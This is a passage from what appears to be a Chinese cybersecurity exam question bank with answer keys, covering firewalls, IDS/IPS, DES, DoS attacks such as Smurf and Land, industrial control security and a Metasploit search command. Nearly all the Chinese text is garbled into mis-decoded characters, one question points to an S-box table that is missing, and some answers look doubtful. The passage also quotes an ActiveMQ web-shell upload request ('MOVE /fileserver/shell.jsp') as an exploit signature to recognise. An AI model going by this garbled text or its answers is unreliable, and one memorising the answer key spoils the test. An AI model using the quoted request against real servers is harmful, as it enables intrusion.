LLC</p><p>C DLC</p><p>D CDP</p><p>$HOME/.netrcæ–‡ä»¶åŒ…å«ä¸‹åˆ—å“ªç§å‘½ä»¤çš„è‡ªåŠ¨ç™»å½•ä¿¡æ¯ï¼Ÿï¼ˆDï¼‰</p><p>A rlogin</p><p>B rsh</p><p>C ssh</p><p>D ftp</p><p>å·¥ä¸šé˜²ç«å¢™æ˜¯é˜²ç«å¢™æ˜¯å»ºç«‹åœ¨å¯ä¿¡ä»»ã€å®‰å…¨çš„å†…éƒ¨ç½‘ç»œå’Œä¸å®‰å…¨æˆ–ä¸è¢«ä¿¡ä»»çš„å¤–éƒ¨ç½‘ç»œä¹‹é—´çš„ä¸€ä¸ªç”µå­æ …æ ï¼Œå·¥ä¸šé˜²ç«å¢™æŠ€æœ¯æ˜¯ä¸€ç§ï¼ˆBï¼‰å®‰å…¨æ¨¡å‹</p><p>A ä»¥ä¸Šéƒ½ä¸æ˜¯</p><p>B è¢«åŠ¨å¼</p><p>C ä¸»åŠ¨å¼</p><p>D æ··åˆå¼</p><p>è¯·æ±‚ç‰‡æ®µï¼šMOVE /fileserver/shell.jspï¼Œæ˜¯ä»¥ä¸‹å“ªä¸ªæœåŠ¡æ¼æ´çš„å…¸å‹åˆ©ç”¨ç‰¹å¾ï¼Ÿï¼ˆCï¼‰</p><p>A nginx</p><p>B apache</p><p>C activemq</p><p>D IIS</p><p>IDSå’ŒIPSè®¾å¤‡æ£€æŸ¥ç½‘ç»œæ•°æ®åŒ…ä¸­çš„æ¶æ„ä»£ç æ ‡å¿—æˆ–æ¼æ´åˆ©ç”¨ç¨‹åºçš„ç‰¹å¾é‡ï¼Œä¸‹åˆ—æœ‰å…³IDSå’ŒIPS é…ç½®ç­–ç•¥æœ‰è¯¯çš„æ˜¯ï¼šï¼ˆAï¼‰</p><p>A IDSå’ŒIPSè®¾å¤‡ä¸èƒ½è¯†åˆ«å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç½‘ç»œåè®®å…³é”®åŠŸèƒ½ä»£ç ï¼›</p><p>B IDSå’ŒIPSè®¾å¤‡å‘Šè­¦ä»»ä½•é’ˆå¯¹å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç½‘ç»œçš„ç«¯å£æ‰«æï¼›</p><p>C IPSè®¾å¤‡åº”é˜»æ­¢ä»»ä½•è·¨å®‰å…¨åŸŸè¾¹ç•Œçš„æœªå®šä¹‰çš„æµé‡ï¼›</p><p>D IDSè®¾å¤‡è®°å½•å®‰å…¨åŸŸå†…æ­£å¸¸æˆ–åˆæ³•æ´»åŠ¨ï¼Œæœ‰åŠ©äºåˆè§„æ€§æ£€æµ‹æŠ¥å‘Šï¼›</p><p>Radiusåè®®åŒ…æ˜¯é‡‡ç”¨ ( A )ä½œä¸ºå…¶ä¼ è¾“æ¨¡å¼çš„ã€‚</p><p>A UDP</p><p>B ä»¥ä¸Šä¸¤è€…å‡å¯</p><p>C å…¶ä»–</p><p>D TCP</p><p>æº IPä¸º 100.1.1.1ï¼Œç›®çš„ IPä¸º 100.1.1.255ï¼Œè¿™ä¸ªæŠ¥æ–‡å±äºä»€ä¹ˆæ”»å‡»ï¼Ÿï¼ˆ D ï¼‰ï¼ˆå‡è®¾è¯¥ç½‘æ®µæ©ç ä¸º 255.255.255.0ï¼‰</p><p>A FRAGGLEæ”»å‡»</p><p>B WINNUKEæ”»å‡»</p><p>C LANDæ”»å‡»</p><p>D SMURFæ”»å‡»</p><p>å¤–éƒ¨æ¸—é€å›¢é˜Ÿæ­£åœ¨ç»™å®¢æˆ·çš„ç½‘ç»œå®æ–½æ¸—é€æµ‹è¯•ã€‚æµ‹è¯•å›¢é˜Ÿåªèƒ½æ ¹æ®ä»Webä¸Šè·å–çš„ä¿¡æ¯æ¥å®æ–½æ”»å‡»ã€‚å®¢æˆ·ç½‘ç»œçš„å‘˜å·¥çŸ¥é“å°†è¦è¿›è¡Œæµ‹è¯•ï¼Œä½†æ¸—é€æµ‹è¯•å›¢é˜Ÿåªèƒ½ä½¿ç”¨å…¬å¼€è·å¾—çš„ä¿¡æ¯å’Œä¸€äº›å®¢æˆ·ç»™çš„ä¿¡æ¯ã€‚æµ‹è¯•å›¢é˜Ÿè®¤è¯†çš„ç¨‹åº¦å’Œæµ‹è¯•çš„ç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿï¼ˆDï¼‰</p><p>A é›¶äº†è§£ï¼›ç›®æ ‡æµ‹è¯•</p><p>B éƒ¨åˆ†äº†è§£ï¼›åŒç›²æµ‹</p><p>C å®Œå…¨äº†è§£ï¼›ç›²æµ‹</p><p>D éƒ¨åˆ†äº†è§£ï¼›ç›²æµ‹</p><p>ä¸‹åˆ—è¯´æ³•ä¸å±äºå·¥ä¸šæ§åˆ¶ç³»ç»Ÿç¡¬ä»¶è„†å¼±æ€§çš„æ˜¯ï¼šï¼ˆDï¼‰</p><p>A å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸­çš„å…³é”®éƒ¨ä½æ²¡æœ‰å®‰è£…å¤‡ç”¨ç”µæºï¼Œç³»ç»Ÿçš„æ‰ç”µäº‹æ•…å°†å…³é—­æ•´ä¸ªå·¥ä¸šæ§åˆ¶ç³»ç»Ÿå¹¶å¯èƒ½è§¦å‘è¿›å…¥ä¸å®‰å…¨çŠ¶æ€ï¼Œç³»ç»Ÿæ‰ç”µäº‹æ•…è¿˜å¯èƒ½å¼•èµ·ç³»ç»Ÿæ¢å¤ä¸å®‰å…¨çš„ç¼ºçœé…ç½®ï¼›</p><p>B æ§åˆ¶ç³»ç»Ÿä¸­çš„ç¡¬ä»¶å­˜åœ¨æ— çº¿ç”µé¢‘ç‡å’Œç”µç£è„‰å†²æ–¹é¢çš„è„†å¼±æ€§ï¼Œå¯ä»¥å¼•å‘æ§åˆ¶æŒ‡ä»¤çš„çŸ­æš‚ä¸­æ–­ï¼Œç”šè‡³å¯¼è‡´ç”µè·¯æ¿çš„æ°¸ä¹…ç ´åï¼›</p><p>C ç¼ºå°‘å¯¹å…³é”®éƒ¨ä»¶çš„å†—ä½™å¤‡ä»½ï¼Œå°†ä½¿å•ç‚¹æ•…éšœå¼•å‘æ•´ä¸ªç³»ç»Ÿç˜«ç—ªï¼›</p><p>D é•¿æœŸæœªå‡çº§æ‰“è¡¥ä¸çš„æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼Œå¯èƒ½éšè—æ–°çš„ã€æœªè¢«å‘ç°ä¸”ææ˜“é€ æˆç ´åçš„è„†å¼±æ€§ï¼Œéœ€å¯¹å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¿¡æ¯å®‰å…¨è¡¥ä¸æ“ä½œåŠç»´æŠ¤è¿‡ç¨‹åˆ¶å®šè§„èŒƒï¼›</p><p>å¯¹äºè‡ªåŠ¨åŒ–æ‰«æå·¥å…·ï¼Œä¸€èˆ¬éœ€è¦ç™»å½•åè¿›è¡Œæ£€æµ‹ï¼Œä»¥è·å¾—æ›´å¤šçš„ç»“æœï¼Œä¸‹åˆ—è®¤è¯æ–¹å¼é”™è¯¯çš„æ˜¯ï¼Ÿï¼ˆBï¼‰</p><p>A ä½¿ç”¨å½•å…¥åŠŸèƒ½å½•å…¥ç”¨æˆ·åå¯†ç </p><p>B å¤åˆ¶å­˜æ´»é¡µé¢çš„urlå¹¶è¿›è¡Œé…ç½®ä»£ç†</p><p>C åœ¨å·¥å…·ä¸­ç›´æ¥è¾“å…¥ç”¨æˆ·åå¯†ç </p><p>D å¤åˆ¶å­˜æ´»é¡µé¢çš„cookieså¹¶é…ç½®ä»£ç†</p><p>å¤–éƒ¨ç½‘å…³åè®®bgpæ˜¯ä¸åŒè‡ªæ²»ç³»ç»Ÿçš„è·¯ç”±å™¨ä¹‹é—´äº¤æ¢è·¯ç”±ä¿¡æ¯çš„åè®®ï¼Œbgp-4ä½¿ç”¨å››ç§æŠ¥æ–‡:æ‰“å¼€æŠ¥æ–‡ã€æ›´æ–°æŠ¥æ–‡ã€ä¿æ´»æŠ¥æ–‡å’Œé€šçŸ¥æŠ¥æ–‡ã€‚å…¶ä¸­ç”¨æ¥ç¡®è®¤æ‰“å¼€æŠ¥æ–‡å’Œå‘¨æœŸæ€§åœ°è¯å®é‚»ç«™å…³ç³»çš„æ˜¯ï¼ˆC ï¼‰ã€‚</p><p>A æ›´æ–°æŠ¥æ–‡</p><p>B é€šçŸ¥æŠ¥æ–‡</p><p>C ä¿æ´»æŠ¥æ–‡</p><p>D æ‰“å¼€æŠ¥æ–‡</p><p>å¯¹ç§°åŠ å¯†åˆç§°ä¸ºï¼ˆDï¼‰æˆ–å•å¯†é’¥åŠ å¯†ã€‚</p><p>A ç‰¹æ®Šå¯†é’¥åŠ å¯†</p><p>B å¯†é’¥åŠ å¯†</p><p>C ç®€å•å¯†é’¥åŠ å¯†</p><p>D å¸¸è§„åŠ å¯†</p><p>IDSå…¥ä¾µæ£€æµ‹ç³»ç»Ÿä¸€èˆ¬æœ‰å‡ ç§ç±»å‹ã€‚å“ªç§ç±»å‹å»ºç«‹äº†ä¸€ä¸ªåœºæ™¯ä¸­æ­£å¸¸è¡Œä¸ºçš„æ¦‚å†µï¼Œå¹¶æ ¹æ®è¿™ä¸ªç»™å‡ºä¸€ä¸ªæ•°æ®åŒ…çš„å¼‚å¸¸å€¼ã€‚ï¼ˆAï¼‰</p><p>A åŸºäºç»Ÿè®¡å¼‚å¸¸çš„</p><p>B åŸºäºçŠ¶æ€çš„</p><p>C è¯¯ç”¨æ£€æµ‹ç³»ç»Ÿ</p><p>D åŸºäºåè®®ç‰¹å¾</p><p>pdræ¨¡å‹æ˜¯ä¸€ç§ä½“ç°ä¸»åŠ¨é˜²å¾¡æ€æƒ³çš„ç½‘ç»œå®‰å…¨æ¨¡å‹ï¼Œè¯¥æ¨¡å‹ä¸­dè¡¨ç¤ºï¼ˆ A ï¼‰ã€‚</p><p>A detectionï¼ˆæ£€æµ‹ï¼‰</p><p>B defenseï¼ˆé˜²å¾¡ï¼‰</p><p>C defendï¼ˆä¿æŠ¤ï¼‰</p><p>D designï¼ˆè®¾è®¡ï¼‰</p><p>å¯¹ä½¿ç”¨å ¡å’ä¸»æœºåŒºåŸŸæ—¶ï¼Œä¸‹åˆ—å¯¹äºé…ç½®é˜²ç«å¢™è§„åˆ™é”™è¯¯çš„æ˜¯ï¼šï¼ˆDï¼‰</p><p>A åªå…è®¸é€šè¿‡å¿…è¦çš„æœåŠ¡å’Œé€šä¿¡</p><p>B ä»æºåœ°å€ã€ç›®çš„åœ°å€ã€æœåŠ¡å’Œç«¯å£è¿›è¡Œé™åˆ¶</p><p>C ç¦æ­¢ä»å†…éƒ¨æµé‡åˆ°æ§åˆ¶ç³»ç»Ÿçš„è¿æ¥</p><p>D å…è®¸ç©¿è¶Šå ¡å’ä¸»æœºï¼Œå¯¹æ§åˆ¶ç½‘ç»œçš„è®¿é—®</p><p>SQLæ³¨å…¥æ”»å‡»å¯é€šè¿‡ä½•ç§æ–¹å¼è¿›è¡Œé˜²æŠ¤ï¼ˆ D ï¼‰</p><p>A è´­ä¹°ç¡¬ä»¶é˜²ç«å¢™ï¼Œå¹¶åªå¼€æ”¾ç‰¹å®šç«¯å£</p><p>B å°†å¯†ç è®¾ç½®ä¸º12ä½çš„ç‰¹åˆ«å¤æ‚å¯†ç </p><p>C å®‰è£…æœ€æ–°çš„ç³»ç»Ÿè¡¥ä¸</p><p>D ä½¿ç”¨webåº”ç”¨é˜²ç«å¢™è¿›è¡Œé˜²æŠ¤</p><p>åœ¨ä¼ è¾“æ¨¡å¼ IPSecåº”ç”¨æƒ…å†µä¸­ï¼Œä»¥ä¸‹å“ªä¸ªåŒºåŸŸæ•°æ®æŠ¥æ–‡å¯å—åˆ°åŠ å¯†å®‰å…¨ä¿æŠ¤ï¼Ÿï¼ˆBï¼‰</p><p>A æ–° IPå¤´</p><p>B ä¼ è¾“å±‚åŠä¸Šå±‚æ•°æ®æŠ¥æ–‡</p><p>C æ•´ä¸ªæ•°æ®æŠ¥æ–‡</p><p>D åŸ IPå¤´</p><p>ä¸‹åˆ—å…³äºEFSè¯´æ³•é”™è¯¯çš„æ˜¯ï¼ˆ A ï¼‰</p><p>A EFSåŠ å¯†åçš„æ–‡ä»¶ä¸å¯åˆ é™¤</p><p>B EFSåŠ å¯†æ–‡ä»¶ç³»ç»Ÿåªåœ¨NTFSåˆ†åŒºä¸‹æœ‰æ•ˆ</p><p>C EFSåŠ å¯†åçš„æ–‡ä»¶å¯åˆ é™¤</p><p>D EFSå¯¹æ–‡ä»¶æœ‰æ•ˆ,æ–‡ä»¶å¤¹æ— æ•ˆ</p><p>å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç½‘ç»œå’Œä¸ä¹‹ç›¸è¿çš„å…¶ä»–çš„ç½‘ç»œçš„ç¼ºé™·ã€é”™è¯¯é…ç½®æˆ–ä¸å®Œå–„çš„ç½‘ç»œç®¡ç†è¿‡ç¨‹å¯èƒ½å¯¼è‡´å·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„è„†å¼±æ€§ï¼Œä¸‹åˆ—æè¿°é”™è¯¯çš„æ˜¯ï¼šï¼ˆBï¼‰</p><p>A ä½¿ç”¨å‡ºå‚è®¾å¤‡çš„ç¼ºçœé…ç½®é€šå¸¸å¯¼è‡´å¼€æ”¾ä¸å®‰å…¨ã€ä¸å¿…è¦çš„ç«¯å£ï¼Œå¹¶æš´éœ²å‡ºä¸»æœºä¸Šå¯è¢«åˆ©ç”¨çš„æœåŠ¡ã€‚</p><p>B å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸­çš„åŸºç¡€è®¾æ–½ç½‘ç»œç¯å¢ƒç»å¸¸éšç€è¿è¡Œçš„éœ€æ±‚æ”¹å˜è€Œä¸æ–­ä¿®æ”¹å’Œå®Œå–„ï¼Œä¸ç”¨æ‹…å¿ƒè€ƒè™‘è¿™äº›å˜åŒ–å¯¹ç³»ç»Ÿçš„æ½œåœ¨çš„å®‰å…¨æ–¹é¢çš„å½±å“ã€‚</p><p>C ä¸å®‰å…¨çš„é€šç”¨ä¸²è¡Œæ€»çº¿ï¼ˆUSBï¼‰å’ŒPS/2ç«¯å£å‡å¯ä»¥å…è®¸éæˆæƒè¿æ¥å¤–å›´è®¾å¤‡ï¼›</p><p>D å¾ˆå¤šå·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¸“ç”¨åè®®ä¸­æ²¡æœ‰å®Œæ•´æ€§æ ¡éªŒæœºåˆ¶ï¼Œä¸ºäº†ç¡®ä¿å®Œæ•´æ€§ï¼Œå·¥ä¸šæ§åˆ¶ç³»ç»Ÿå¯ä»¥ä½¿ç”¨è¾ƒä½å±‚æ¬¡çš„åè®®(å¦‚IPsec)ä¸ºæ•°æ®æä¾›å®Œæ•´æ€§ä¿æŠ¤èƒ½åŠ›</p><p>ICMP åè®®çš„ç›®çš„æ˜¯ï¼ˆAï¼‰ã€‚</p><p>A å‘é€æ§åˆ¶æ¶ˆæ¯ï¼Œæä¾›é€šä¿¡ç¯å¢ƒçš„é—®é¢˜åé¦ˆ</p><p>B åœ¨ä¸»æœºé—´å»ºç«‹è¿æ¥ï¼Œæä¾›å¯é æ•° æ®ä¼ è¾“</p><p>C å¿«é€Ÿå‘é€æ•°æ®åŒ…ï¼Œä¸è¿½æ±‚æ•°æ®å¯é æ€§</p><p>D å®šä½ç›®çš„ä¸»æœºï¼Œå¯»æ‰¾åˆé€‚çš„ä¼ è¾“è·¯ å¾„</p><p>ä»€ä¹ˆæ–¹å¼èƒ½å¤Ÿä»è¿œç¨‹ç»•è¿‡é˜²ç«å¢™å»å…¥ä¾µä¸€ä¸ªç½‘ç»œï¼Ÿï¼ˆAï¼‰</p><p>A Modem banks</p><p>B Identified network topology</p><p>C Active ports</p><p>D IP services_</p><p>ä»¥ä¸‹å„ç§åŠ å¯†ç®—æ³•ä¸­å±äºåŒé’¥åˆ¶åŠ å¯†ç®—æ³•çš„æ˜¯ï¼ˆ B ï¼‰</p><p>A Vigenereç®—æ³•åŠ å¯†</p><p>B Diffe-HellmanåŠ å¯†</p><p>C Caesaræ›¿ä»£æ³•</p><p>D DESåŠ å¯†ç®—æ³•</p><p>é’ˆå¯¹ç‰¹å®šå·¥ä¸šç³»ç»Ÿç›®æ ‡çš„è¿›è¡Œé•¿æ—¶é—´æŒç»­æ€§çš„ç½‘ç»œæ”»å‡»è¢«ç§°ä¸ºï¼ˆDï¼‰</p><p>A CC</p><p>B DDOS</p><p>C LTMT</p><p>D APT</p><p>å…³äºã€Šå·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¿¡æ¯å®‰å…¨é˜²æŠ¤æŒ‡å—ã€‹ï¼Œæè¿°é”™è¯¯çš„æ˜¯ï¼šï¼ˆDï¼‰</p><p>A ç”±å·¥ä¸šå’Œä¿¡æ¯åŒ–éƒ¨å°å‘</p><p>B é‡ç‚¹æŒ‡å¯¼å·¥ä¸šä¼ä¸šå¼€å±•å®‰å…¨é˜²æŠ¤æ´»åŠ¨</p><p>C æ³¨é‡é˜²æŠ¤è¦æ±‚çš„å¯æ‰§è¡Œæ€§ï¼Œä»ç®¡ç†ã€æŠ€æœ¯ä¸¤æ–¹é¢æ˜ç¡®å·¥ä¸šä¼ä¸šå·¥æ§å®‰å…¨é˜²æŠ¤è¦æ±‚</p><p>D ä¸»è¦æ¶‰åŠå·¥æ§ç³»ç»ŸåŠŸèƒ½å®‰å…¨</p><p>metasploitä¸­ï¼Œæœç´¢cve2019-0708çš„æŒ‡ä»¤æ˜¯ï¼ˆCï¼‰ï¼Ÿ</p><p>A show cve 2019-0708</p><p>B find cve2019-0708</p><p>C search cve:2019-0708</p><p>D search cve2019-0708</p><p>åœ¨ DES ä¸­ï¼Œæ•°æ®ä»¥ï¼ˆDï¼‰æ¯”ç‰¹åˆ†ç»„è¿›è¡ŒåŠ å¯†ã€‚</p><p>A 128</p><p>B 32</p><p>C 16</p><p>D 64</p><p>å·²çŸ¥desç®—æ³•sç›’å¦‚ä¸‹:</p><p>å¦‚æœè¯¥sç›’çš„è¾“å…¥110011,åˆ™å…¶äºŒè¿›åˆ¶è¾“å‡ºä¸º( B )ã€‚</p><p>A 1001</p><p>B 1110</p><p>C 0100</p><p>D 0101</p><p>é˜²ç«å¢™çš„å®‰å…¨è§„åˆ™ç”±åŒ¹é…æ¡ä»¶å’Œå¤„ç†æ–¹å¼ä¸¤éƒ¨åˆ†ç»„æˆã€‚å½“ç½‘ç»œæµé‡ä¸å½“å‰çš„è§„åˆ™åŒ¹é…æ—¶ï¼Œå°±å¿…é¡»é‡‡ç”¨è§„åˆ™ä¸­çš„å¤„ç†æ–¹å¼è¿›è¡Œå¤„ç†ã€‚å…¶ä¸­ï¼Œæ‹’ç»æ•°æ®åŒ…æˆ–ä¿¡æ¯é€šè¿‡ï¼Œå¹¶ä¸”é€š çŸ¥ä¿¡æ¯æºè¯¥ä¿¡æ¯è¢«ç¦æ­¢çš„å¤„ç†æ–¹å¼æ˜¯ï¼ˆ D ï¼‰ã€‚</p><p>A accept</p><p>B drop</p><p>C refuse</p><p>D reject</p><p>æ˜æ–‡è®¤è¯çš„æ—¶å€™ï¼Œå¯†ç æœ€å¤šæ”¯æŒï¼ˆAï¼‰ä¸ªå­—ç¬¦ã€‚</p><p>A 8</p><p>B 64</p><p>C 32</p><p>D 16</p><p>èœœç½æŠ€æœ¯æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å¯¹æ”»å‡»æ–¹è¿›è¡Œæ¬ºéª—çš„æŠ€æœ¯ï¼Œé€šè¿‡å¸ƒç½®ä¸€äº›ä½œä¸ºè¯±é¥µçš„ä¸»æœºã€ç½‘ç»œæœåŠ¡æˆ–è€…ä¿¡æ¯ï¼Œè¯±ä½¿æ”»å‡»æ–¹å¯¹å®ƒä»¬å®æ–½æ”»å‡»ï¼Œä»è€Œå¯ä»¥å¯¹æ”»å‡»è¡Œä¸ºè¿›è¡Œæ•è·å’Œåˆ†æï¼Œä¸‹åˆ—å“ªä¸€ä¸ªæ˜¯å·¥æ§èœœç½ï¼šï¼ˆDï¼‰</p><p>A Beeswarmï¼›</p><p>B shhipotï¼›</p><p>C T-Potï¼›</p><p>D Conpotï¼›</p><p>Linuxä¸­ï¼Œå‘ç³»ç»Ÿä¸­æŸä¸ªç‰¹å®šç”¨æˆ·å‘é€ä¿¡æ¯ï¼Œç”¨ä»€ä¹ˆå‘½ä»¤ï¼Ÿï¼ˆBï¼‰</p><p>A wall</p><p>B write</p><p>C net send</p><p>D mesg</p><p>sslåè®®ï¼ˆå®‰å…¨å¥—æ¥å±‚åè®®ï¼‰æ˜¯netscapeå…¬å¸æ¨å‡ºçš„ä¸€ç§å®‰å…¨é€šä¿¡åè®®ï¼Œä»¥ä¸‹æœåŠ¡ä¸­ï¼Œsslåè®®ä¸èƒ½æä¾›çš„æ˜¯ï¼ˆ B ï¼‰ã€‚</p><p>A ç”¨æˆ·å’ŒæœåŠ¡å™¨çš„åˆæ³•æ€§è®¤è¯æœåŠ¡</p><p>B åŸºäºudpåº”ç”¨çš„å®‰å…¨ä¿æŠ¤</p><p>C ç»´æŠ¤æ•°æ®çš„å®Œæ•´æ€§</p><p>D åŠ å¯†æ•°æ®æœåŠ¡ä»¥éšè—è¢«ä¼ è¾“çš„æ•°æ®</p><p>ç”¨ä¸€ä¸ªç‰¹åˆ«æ‰“é€ çš„SYNæ•°æ®åŒ…ï¼Œå®ƒçš„åŸåœ°å€å’Œç›®æ ‡åœ°å€éƒ½è¢«è®¾ç½®æˆæŸä¸€ä¸ªæœåŠ¡å™¨åœ°å€ã€‚è¿™æ ·å°†å¯¼è‡´æ¥æ”¶æœåŠ¡å™¨å‘ä»–è‡ªå·±çš„åœ°å€å‘é€SYN-ACKä¿¡æ¯ï¼Œç»“æœè¿™ä¸ªåœ°å€åˆå‘å›ACKä¿¡æ¯å¹¶åˆ›å»ºä¸€ä¸ªç©ºè¿æ¥ï¼Œè¢«æ”»å‡»çš„æœåŠ¡å™¨æ¯æ¥æ”¶åˆ°ä¸€ä¸ªè¿™æ ·çš„è¿æ¥å°±å°†å…¶ä¿å­˜ï¼Œç›´åˆ°è¶…æ—¶ï¼Œè¿™ç§æ‹’ç»æœåŠ¡æ”»å‡»æ˜¯ä¸‹åˆ—ä¸­çš„ï¼ˆBï¼‰ã€‚</p><p>A SYN Flooding æ”»å‡»</p><p>B Landæ”»å‡»</p><p>C UDP Storm æ”»å‡»</p><p>D Teardrop æ”»å‡»</p><p>äº¤æ¢æœºçš„åœ°å€å­¦ä¹ æ˜¯é‡‡ç”¨ MAC åœ°å€è¡¨æ¥å­˜å‚¨ MAC åœ°å€ä¸ï¼ˆCï¼‰çš„æ˜ å°„å…³ç³»å®ç°çš„ã€‚</p><p>A ç¡¬ä»¶æ’æ§½</p><p>B LLC åœ°å€</p><p>C ç«¯å£</p><p>D IP åœ°å€</p><p>å·¥æ§åè®®ç¼ºä¹ä¿å¯†å’ŒéªŒè¯æœºåˆ¶ï¼Œç‰¹åˆ«ç¼ºä¹éªŒè¯ä¸€ä¸ªä¸»ç«™å’Œä»ç«™ä¹‹é—´å‘é€çš„æ¶ˆæ¯çš„å®Œæ•´æ€§æŠ€æœ¯ï¼Œä¸‹é¢æ”»å‡»ä¸å±äºåˆ©ç”¨å·¥ä¸šåè®®è„†å¼±æ€§çš„æ˜¯ï¼šï¼ˆBï¼‰</p><p>A æ”»å‡»è€…é‡å¤å‘é€åˆæ³•çš„å·¥ä¸šå·¥æ§ç³»ç»Ÿæ¶ˆæ¯ï¼Œå¹¶å°†å®ƒä»¬å‘é€åˆ°ä»ç«™è®¾å¤‡ï¼Œä»è€Œé€ æˆè®¾å¤‡æŸæ¯ã€è¿‡ç¨‹å…³é—­ç­‰ç ´åï¼›</p><p>B å¤–éƒ¨äººå‘˜éæ³•è®¿é—®ç½‘ç»œè®¾å¤‡å°†å¯¼è‡´å·¥ä¸šæ§åˆ¶ç³»ç»Ÿè®¾å¤‡ç¡¬ä»¶å’Œæ•æ„Ÿæ•°æ®é—å¤±ï¼›</p><p>C å‘RTUå‘é€æ— æ„ä¹‰çš„ä¿¡æ¯ï¼Œæ¶ˆè€—æ§åˆ¶ç½‘ç»œçš„å¤„ç†å™¨èµ„æºå’Œå¸¦å®½èµ„æºï¼›</p><p>D å‘æ§åˆ¶æ“ä½œäººå‘˜å‘é€è™šå‡çš„ã€æ¬ºéª—ä¿¡æ¯ï¼Œå¯¼è‡´æ“ä½œä¸­å¿ƒä¸èƒ½æ­£ç¡®äº†è§£ç”Ÿäº§æ§åˆ¶ç°åœºçš„å®é™…å·¥å†µï¼Œè¯±ä½¿å…¶æ‰§è¡Œé”™è¯¯æ“ä½œï¼›</p><p>å¦‚æœå¸Œæœ›æœ¬äº¤æ¢æœºä¸Šå¯¹ vlan æ‰€åšçš„åˆ›å»ºã€åˆ é™¤ã€ä¿®æ”¹ï¼Œè¢«ç®¡ç†åŸŸä¸­å…¶ä»–äº¤æ¢æœºåŒæ­¥ï¼Œ åˆ™åº”è¯¥è®¾ç½®æœ¬äº¤æ¢æœºä¸ºï¼ˆBï¼‰æ¨¡å¼ã€‚</p><p>A éé€æ˜</p><p>B æœåŠ¡å™¨</p><p>C é€æ˜</p><p>D å®¢æˆ·</p><p>IOTæ¶æ„è½¯ä»¶å¢é•¿è¶‹åŠ¿æœ€å¿«å¾—çš„å®¶æ—ï¼Œæ˜¯ä»¥ä¸‹å“ªä¸ªï¼Ÿï¼ˆCï¼‰</p><p>A Mirai</p><p>B bitcoin</p><p>C Gafgyt</p><p>D Tsunami</p><p>æ”»å‡»è€…å¯èƒ½åˆ©ç”¨ä¸å¿…è¦çš„ extprocå¤–éƒ¨ç¨‹åºè°ƒç”¨åŠŸèƒ½è·å–å¯¹ç³»ç»Ÿçš„æ§åˆ¶æƒï¼Œå¨èƒç³»ç»Ÿå®‰å…¨ã€‚å…³é—­ ExtprocåŠŸèƒ½éœ€è¦ä¿®æ”¹ TNSNAMES.ORAå’Œ LISTENER.ORAæ–‡ä»¶åˆ é™¤ä¸€ä¸‹æ¡ç›®ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªé”™è¯¯çš„è¯·é€‰æ‹©å‡ºæ¥ï¼ˆAï¼‰ã€‚</p><p>A sys_ertproc</p><p>B PLSExtproc</p><p>C extproc</p><p>D icache_extproc</p><p>å½“ä¸€ä¸ªåº”ç”¨ç³»ç»Ÿè¢«æ”»å‡»å¹¶å—åˆ°äº†ç ´ååï¼Œç³»ç»Ÿç®¡ç†å‘˜ä»æ–°å®‰è£…å’Œé…ç½®äº†æ­¤åº”ç”¨ç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿé‡æ–°ä¸Šçº¿å‰ç®¡ç†å‘˜ä¸éœ€æŸ¥çœ‹ï¼ˆCï¼‰</p><p>A ç”¨æˆ·è´¦æˆ·å’Œæƒé™çš„è®¾ç½®</p><p>B è®¿é—®æ§åˆ¶åˆ—è¡¨</p><p>C å®¡è®¡è®°å½•</p><p>D ç³»ç»ŸæœåŠ¡é…ç½®æƒ…å†µ</p><p>ç®€å•çš„æ”»å‡»ä¹Ÿç”±å¾ˆå¤šæ­¥éª¤ç»„æˆï¼Œä¸ºæ¢æµ‹ä¸€ä¸ªå®‰å…¨äº‹æ•…ï¼Œéœ€è¦è§‚æµ‹å¤šä¸ªäº‹ä»¶å¹¶åœ¨å…¶ä¸­å¯»æ‰¾ è§„å¾‹ï¼Œç„¶è€Œï¼Œç›®å‰è®¾è®¡æˆå‹çš„äº‹ä»¶å…³è”ç³»ç»Ÿå¹¶ä¸é€‚åˆåœ¨æ§åˆ¶ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œå› æ­¤åœ¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç½‘ç»œä¸­æ¢æµ‹æ›´åŠ é«˜çº§çš„æ”»å‡»å¨èƒæ˜¯å·¨å¤§çš„æŒ‘æˆ˜ï¼Œä¸‹åˆ—ä¸å±äºå·¥ä¸šæ§åˆ¶ç³»ç»Ÿä¿¡æ¯é«˜çº§å¨èƒæ¢æµ‹æŠ€æœ¯çš„æ˜¯ï¼šï¼ˆBï¼‰</p><p>A ITä¸OTç³»ç»Ÿçš„å…³è”æ€§ï¼›</p><p>B å¼‚å¸¸è¡Œä¸ºæ¢æµ‹ï¼›</p><p>C æ•°æ®ä¸°å¯Œè¿‡ç¨‹ï¼›</p><p>D äº‹ä»¶å…³è”æœºåˆ¶ï¼›</p><p>å·¥ä¸šæ§åˆ¶ç³»ç»Ÿä½“ç³»æ¶æ„çš„è„†å¼±æ€§ç›´æ¥æºè‡ªå·¥ä¸šæ§åˆ¶ç³»ç»Ÿçš„åŸºæœ¬æ¶æ„ï¼Œç°ä»£å·¥ä¸šç³»ç»Ÿæ‰€ä½¿ç”¨çš„å·¥æ§æ¶æ„ï¼Œä¸20ä¸–çºª80å¹´ä»£å’Œ90å¹´ä»£ä½¿ç”¨çš„æ¶æ„ç›¸æ¯”ï¼ŒåŸåˆ™ä¸Šæ˜¯æ²¡æœ‰å¤ªå¤§åŒºåˆ«ã€‚ä¸‹é¢å“ªä¸€é¡¹ä¸å±äºå·¥ä¸šæ§åˆ¶ç³»ç»Ÿç³»ç»Ÿæ¶æ„è„†å¼±æ€§ï¼šï¼ˆDï¼‰</p><p>A åœ¨å·¥ä¸šæ§åˆ¶ç³»ç»Ÿç³»ç»Ÿæ¶æ„ä¸­ï¼Œå·¥æ§ç³»ç»Ÿçš„æ´»åŠ¨ç»„ä»¶ä¹‹é—´ç¼ºä¹è®¤è¯ï¼›</p><p>B 